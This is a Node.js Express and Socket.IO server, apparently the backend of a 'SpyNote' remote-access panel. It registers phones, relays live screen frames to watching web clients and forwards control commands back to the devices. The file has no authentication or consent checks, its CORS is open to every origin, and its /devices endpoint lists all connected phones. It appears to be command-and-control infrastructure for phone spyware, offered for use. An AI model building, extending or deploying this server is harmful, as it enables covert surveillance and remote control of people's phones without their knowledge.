const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000,
    maxHttpBufferSize: 100e6 // 🔥 Large JPEG frames
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Connection:', socket.id);

    // 🔥 DEVICE REGISTRATION
    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(deviceId);
            console.log('📱 Device LIVE:', deviceId, deviceInfo.model);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // 🔥 LIVE SCREEN RELAY (phone → ALL web clients watching device)
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            // Update activity
            const device = devices.get(deviceId);
            devices.set(deviceId, { ...device, lastSeen: Date.now() });
            
            // 🔥 FAST RELAY TO ALL WATCHING CLIENTS
            socket.to(deviceId).emit('screen-update', data);
        }
    });

    // 🔥 CONTROL RELAY (web → phone)
    socket.on('control', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', data);
            console.log('🎮 Control:', data.action, '→', deviceId);
        }
    });

    socket.on('disconnect', () => {
        // Mark device offline
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device OFFLINE:', deviceId);
                break;
            }
        }
    });
});

// 🔥 CLEANUP OFFLINE DEVICES
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (!info.connected && (now - info.lastSeen) > 60000) {
            devices.delete(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            console.log('🧹 Removed stale device:', deviceId);
        }
    }
}, 30000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote LIVE Server: http://localhost:${PORT}`);
    console.log(`📱 Web panel ready!`);
    console.log(`🎮 Controls + 30FPS streaming enabled`);
});
